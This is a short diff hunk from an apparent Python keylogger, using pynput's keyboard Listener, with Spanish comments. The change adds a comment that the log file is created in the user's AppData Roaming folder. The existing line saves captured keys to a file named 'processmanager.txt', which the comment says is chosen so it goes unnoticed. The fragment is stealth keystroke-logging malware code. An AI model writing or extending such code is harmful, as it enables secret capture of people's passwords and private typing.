@@ -6,7 +6,7 @@ from pynput.keyboard import Listener
 keys = []
 count = 0
 
-
+# El archivo se crea en la carpeta User/Appdata/Roaming
 path = os.environ ['appdata'] + '\\processmanager.txt' # Elegimos ruta donde guardar el txt + ponemos un nombre que pase desapercibido (Windows)
 
 
